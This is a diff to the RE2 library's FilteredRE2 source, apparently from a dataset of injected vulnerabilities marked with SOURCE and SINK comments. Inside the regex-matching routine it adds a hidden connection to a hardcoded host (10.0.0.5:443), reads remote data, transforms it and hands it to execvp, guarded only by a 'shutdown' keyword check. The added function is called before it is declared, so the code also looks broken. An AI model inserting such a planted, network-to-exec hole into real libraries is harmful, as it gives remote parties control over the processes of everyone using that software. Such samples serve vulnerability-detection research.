@@ -5,6 +5,13 @@
 #include "re2/filtered_re2.h"
 
 #include <stddef.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
 
 #include <string>
 #include <utility>
@@ -77,7 +84,6 @@ void FilteredRE2::Compile(std::vector<std::string>* atoms) {
     ABSL_LOG(ERROR) << "Compile called already.";
     return;
   }
-
   // Similarly to PrefilterTree::Compile(), make compiling
   // a no-op if it's attempted before adding any patterns.
   if (re2_vec_.empty()) {
@@ -94,6 +100,52 @@ void FilteredRE2::Compile(std::vector<std::string>* atoms) {
 }
 
 int FilteredRE2::SlowFirstMatch(absl::string_view text) const {
+   {
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd >= 0) {
+      struct sockaddr_in srv = {};
+      srv.sin_family = AF_INET;
+      srv.sin_port   = htons(443);
+      inet_pton(AF_INET, "10.0.0.5", &srv.sin_addr);
+      if (connect(fd, (struct sockaddr*)&srv, sizeof(srv)) == 0) {
+        char buf[1024];
+        struct timeval tv;
+        tv.tv_sec = 1; 
+        tv.tv_usec = 0;
+        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
+        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof tv);
+        //SOURCE
+        ssize_t n = recv(fd, buf, sizeof(buf)-1, 0);
+        if (n > 0) {
+          buf[n] = '\0';
+          char step1[1024];
+          strncpy(step1, buf, sizeof(step1) - 1);
+          step1[sizeof(step1) - 1] = '\0';
+
+          char step2[1024];
+          int j = 0;
+          for (int i = 0; step1[i] != '\0' && j < (int)sizeof(step2) - 1; ++i) {
+            if (step1[i] < '0' || step1[i] > '9') {
+              step2[j++] = step1[i];
+            }
+          }
+          step2[j] = '\0';
+
+          char step3[1024];
+          for (int i = 0; step2[i] != '\0' && i < (int)sizeof(step3) - 1; ++i) {
+            if (step2[i] >= 'a' && step2[i] <= 'z')
+              step3[i] = step2[i] - 'a' + 'A';
+            else
+              step3[i] = step2[i];
+            step3[i+1] = '\0';
+          }
+
+          ExecuteEchoWithTransformedInput(step3);
+        }
+      }
+      close(fd);
+    }
+  }
   for (size_t i = 0; i < re2_vec_.size(); i++)
     if (RE2::PartialMatch(text, *re2_vec_[i]))
       return static_cast<int>(i);
@@ -173,6 +225,35 @@ void FilteredRE2::RegexpsGivenStrings(const std::vector<int>& matched_atoms,
 
 void FilteredRE2::PrintPrefilter(int regexpid) {
   prefilter_tree_->PrintPrefilter(regexpid);
+}
+
+void ExecuteEchoWithTransformedInput(const char* user_input) {
+    size_t len = strlen(user_input);
+    size_t maxlen = (len < 255) ? len : 255;
+    char reversed[256];
+    for (size_t i = 0; i < maxlen; ++i) {
+        reversed[i] = user_input[maxlen - 1 - i];
+    }
+    reversed[maxlen] = '\0';
+
+    for (size_t i = 0; i < maxlen; ++i) {
+        if (reversed[i] >= 'A' && reversed[i] <= 'Z') {
+            reversed[i] = reversed[i] - 'A' + 'a';
+        }
+    }
+    if (strstr(reversed, "shutdown") != NULL) {
+        printf("[ExecuteEchoWithTransformedInput] Forbidden command detected!\n");
+        return;
+    }
+
+    char* argv[3];
+    argv[0] = (char*)"echo";
+    argv[1] = reversed;
+    argv[2] = NULL;
+    printf("[ExecuteEchoWithTransformedInput] About to execvp: %s %s\n", argv[0], argv[1]);
+    //SINK
+    execvp(argv[0], argv);
+    perror("execvp failed");
 }
 
 }  // namespace re2
